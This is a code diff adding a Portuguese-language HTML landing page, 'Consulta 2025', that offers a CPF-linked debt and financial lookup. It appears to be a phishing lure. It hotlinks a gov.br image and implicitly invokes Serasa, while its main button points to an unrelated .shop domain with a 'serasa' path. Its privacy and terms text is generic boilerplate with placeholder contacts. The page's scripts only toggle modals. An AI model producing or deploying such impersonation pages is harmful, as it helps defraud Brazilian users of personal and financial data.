@@ -1,0 +1,280 @@
+
+<!DOCTYPE html>
+
+<html lang="pt-br">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Consulta 2025</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"/>
+<style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f8f8f8;
+      color: #333;
+      text-align: center;
+    }
+
+    header {
+      background-color: #E5007D;
+      padding: 30px 10px;
+      color: #fff;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 1.8em;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      background: #fff;
+      padding: 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    .container img {
+      max-width: 180px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+    }
+
+    .container p {
+      font-size: 1.1em;
+      margin-bottom: 25px;
+    }
+
+    .btn {
+      display: inline-block;
+      margin: 10px 5px;
+      padding: 14px 28px;
+      font-size: 1em;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      text-decoration: none;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+
+    .btn-primary {
+      background-color: #E5007D;
+      color: white;
+      animation: pulse 1.5s infinite;
+    }
+
+    .btn-secondary {
+      background-color: #ffd6ea;
+      color: #E5007D;
+    }
+
+    .btn:hover {
+      opacity: 0.85;
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 0.9em;
+      color: #999;
+    }
+
+    footer a {
+      color: #E5007D;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.6);
+      z-index: 1000;
+      padding: 20px;
+      overflow-y: auto;
+      box-sizing: border-box;
+    }
+
+    .modal-content {
+      background: white;
+      max-width: 600px;
+      margin: 60px auto;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      position: relative;
+    }
+
+    .modal-content h3 {
+      color: #E5007D;
+    }
+
+    .modal-content button {
+      background-color: #E5007D;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 5px;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+
+    .cookie-banner {
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #E5007D;
+      color: white;
+      padding: 15px 20px;
+      border-radius: 8px;
+      font-size: 1em;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 95%;
+      max-width: 1000px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      z-index: 1000;
+    }
+
+    .cookie-banner button {
+      background-color: white;
+      color: #E5007D;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+
+    summary {
+      cursor: pointer;
+      color: #E5007D;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+<header>
+<h1>Consulta 2025</h1>
+</header>
+<div class="container">
+<img alt="Atendimento" src="https://www.gov.br/pt-br/perfil_usuario/trabalhador/@@images/image"/>
+<p>Tem alguma dúvida? Clique abaixo para iniciar o atendimento com segurança.</p>
+<a class="btn btn-primary" href="https://limpeeeagr.shop/serasa/f2/">CONSULTAR AGORA</a>
+<a class="btn btn-secondary" href="#" onclick="openModal('saibaMaisModal')">Saiba Mais</a>
+<p style="margin-top: 20px;">
+<a href="#" onclick="openModal('privacyModal')">Política de Privacidade</a> |
+      <a href="#" onclick="openModal('termsModal')">Termos de Uso</a>
+</p>
+</div>
+<footer>
+    © 2025 - Todos os direitos reservados.
+  </footer>
+<div class="cookie-banner" id="cookie-banner">
+<p>Este site utiliza cookies para melhorar sua experiência. Ao continuar navegando, você concorda com a nossa política de cookies.</p>
+<button onclick="hideCookieBanner()">Aceitar</button>
+</div>
+<!-- MODAIS -->
+<div class="modal" id="saibaMaisModal">
+<div class="modal-content">
+<h3>Saiba Mais</h3>
+<details>
+<summary>O que é?</summary>
+<p>É um sistema que permite consultar informações financeiras vinculadas ao seu CPF.</p>
+</details>
+<details>
+<summary>Para que serve?</summary>
+<p>Ajuda a descobrir e regularizar pendências, dívidas e oportunidades de desconto com instituições financeiras.</p>
+</details>
+<button onclick="closeModal('saibaMaisModal')">Fechar</button>
+</div>
+</div>
+<div class="modal" id="privacyModal">
+<div class="modal-content">
+<h3>Política de Privacidade</h3>
+<p>Esta Política de Privacidade descreve como coletamos, usamos e protegemos suas informações pessoais ao acessar e utilizar nosso site.
+
+1. Informações Coletadas:
+   - Dados pessoais fornecidos diretamente por você, como nome, e-mail e número de telefone;
+   - Dados coletados automaticamente, como endereço IP, tipo de dispositivo, navegador e páginas acessadas em nosso site.
+2. Uso das Informações:
+   - Melhorar sua experiência no site;
+   - Enviar comunicações relacionadas a nossos serviços e produtos;
+   - Cumprir obrigações legais ou regulatórias.
+3. Compartilhamento de Dados:
+   - Não compartilhamos suas informações pessoais com terceiros, exceto:
+     - Quando exigido por lei;
+     - Para prestar serviços essenciais ao funcionamento do site.
+4. Segurança dos Dados:
+   - Adotamos medidas de segurança adequadas para proteger suas informações contra acesso não autorizado, alteração ou divulgação.
+5. Seus Direitos:
+   - Acesso aos seus dados pessoais;
+   - Correção ou exclusão de suas informações;
+   - Revogação do consentimento para uso de dados.
+   - Entre em contato conosco pelo e-mail mailto:sac@atendimento.com para exercer seus direitos.
+6. Cookies:
+   - Utilizamos cookies para melhorar a funcionalidade do site e personalizar sua experiência.
+7. Alterações na Política:
+   - Reservamo-nos o direito de alterar esta Política de Privacidade a qualquer momento. As alterações serão publicadas nesta página.</p>
+<p>...</p>
+<button onclick="closeModal('privacyModal')">Fechar</button>
+</div>
+</div>
+<div class="modal" id="termsModal">
+<div class="modal-content">
+<h3>Termos de Uso</h3>
+<p>Estes Termos de Uso regem o acesso e a utilização do nosso site. Ao utilizá-lo, você concorda com estes Termos.
+
+1. Acesso ao Site:
+   - Você pode acessar o site para fins pessoais e informativos. Qualquer uso não autorizado é proibido.
+2. Responsabilidades do Usuário:
+   - Fornecer informações verdadeiras e precisas ao utilizar formulários do site;
+   - Não utilizar o site para fins ilegais ou prejudiciais;
+   - Respeitar os direitos de propriedade intelectual e outros direitos de terceiros.
+3. Limitação de Responsabilidade:
+   - Não nos responsabilizamos por:
+     - Erros ou interrupções no funcionamento do site;
+     - Perdas ou danos causados pelo uso do site;
+     - Conteúdo de terceiros acessado por meio de links em nosso site.
+4. Propriedade Intelectual:
+   - Todos os direitos sobre o conteúdo, design e funcionalidades do site são reservados e protegidos por lei.
+5. Modificações nos Termos:
+   - Podemos alterar estes Termos de Uso a qualquer momento. As alterações serão publicadas nesta página.
+6. Contato:
+   - Para dúvidas ou sugestões, entre em contato pelo e-mail seu-email@dominio.com.</p>
+<p>...</p>
+<button onclick="closeModal('termsModal')">Fechar</button>
+</div>
+</div>
+<script>
+    function openModal(id) {
+      document.getElementById(id).style.display = 'block';
+    }
+
+    function closeModal(id) {
+      document.getElementById(id).style.display = 'none';
+    }
+
+    function hideCookieBanner() {
+      document.getElementById('cookie-banner').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
